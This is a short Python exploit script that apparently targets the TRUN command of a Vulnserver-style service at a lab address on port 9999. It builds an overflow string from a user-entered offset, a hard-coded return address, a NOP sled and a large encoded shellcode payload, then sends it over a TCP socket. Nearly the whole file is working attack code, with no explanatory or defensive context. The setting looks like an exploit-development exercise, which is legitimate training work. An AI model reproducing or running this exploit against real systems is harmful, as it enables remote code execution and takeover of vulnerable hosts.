import socket
import sys

eip= input("Enter the eip: ")
#eip=2009

overflowPayload=("\xdb\xd5\xbf\x12\xa1\xec\x48\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x78\x17\x03\x78\x17\x83\xfa\x5d\x0e\xbd\x06"
"\x75\x4d\x3e\xf6\x86\x32\xb6\x13\xb7\x72\xac\x50\xe8\x42"
"\xa6\x34\x05\x28\xea\xac\x9e\x5c\x23\xc3\x17\xea\x15\xea"
"\xa8\x47\x65\x6d\x2b\x9a\xba\x4d\x12\x55\xcf\x8c\x53\x88"
"\x22\xdc\x0c\xc6\x91\xf0\x39\x92\x29\x7b\x71\x32\x2a\x98"
"\xc2\x35\x1b\x0f\x58\x6c\xbb\xae\x8d\x04\xf2\xa8\xd2\x21"
"\x4c\x43\x20\xdd\x4f\x85\x78\x1e\xe3\xe8\xb4\xed\xfd\x2d"
"\x72\x0e\x88\x47\x80\xb3\x8b\x9c\xfa\x6f\x19\x06\x5c\xfb"
"\xb9\xe2\x5c\x28\x5f\x61\x52\x85\x2b\x2d\x77\x18\xff\x46"
"\x83\x91\xfe\x88\x05\xe1\x24\x0c\x4d\xb1\x45\x15\x2b\x14"
"\x79\x45\x94\xc9\xdf\x0e\x39\x1d\x52\x4d\x56\xd2\x5f\x6d"
"\xa6\x7c\xd7\x1e\x94\x23\x43\x88\x94\xac\x4d\x4f\xda\x86"
"\x2a\xdf\x25\x29\x4b\xf6\xe1\x7d\x1b\x60\xc3\xfd\xf0\x70"
"\xec\x2b\x56\x20\x42\x84\x17\x90\x22\x74\xf0\xfa\xac\xab"
"\xe0\x05\x67\xc4\x8b\xfc\xe0\x2b\xe3\xff\x9e\xc3\xf6\xff"
"\x4f\x48\x7e\x19\x05\x60\xd6\xb2\xb2\x19\x73\x48\x22\xe5"
"\xa9\x35\x64\x6d\x5e\xca\x2b\x86\x2b\xd8\xdc\x66\x66\x82"
"\x4b\x78\x5c\xaa\x10\xeb\x3b\x2a\x5e\x10\x94\x7d\x37\xe6"
"\xed\xeb\xa5\x51\x44\x09\x34\x07\xaf\x89\xe3\xf4\x2e\x10"
"\x61\x40\x15\x02\xbf\x49\x11\x76\x6f\x1c\xcf\x20\xc9\xf6"
"\xa1\x9a\x83\xa5\x6b\x4a\x55\x86\xab\x0c\x5a\xc3\x5d\xf0"
"\xeb\xba\x1b\x0f\xc3\x2a\xac\x68\x39\xcb\x53\xa3\xf9\xeb"
"\xb1\x61\xf4\x83\x6f\xe0\xb5\xc9\x8f\xdf\xfa\xf7\x13\xd5"
"\x82\x03\x0b\x9c\x87\x48\x8b\x4d\xfa\xc1\x7e\x71\xa9\xe2"
"\xaa")
#625011AF
stringToSend="TRUN /.:/"+ "A"*eip +"\xaf\x11\x50\x62"+"\x90"*32+overflowPayload


try:
    mySocket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    mySocket.connect(("10.0.2.4",9999))
    byteOfString=stringToSend.encode(encoding="latin1")
    mySocket.send(byteOfString)
    mySocket.close()


except KeyboardInterrupt:
    sys.exit()

except Exception as e:
    print(e)
    sys.exit()
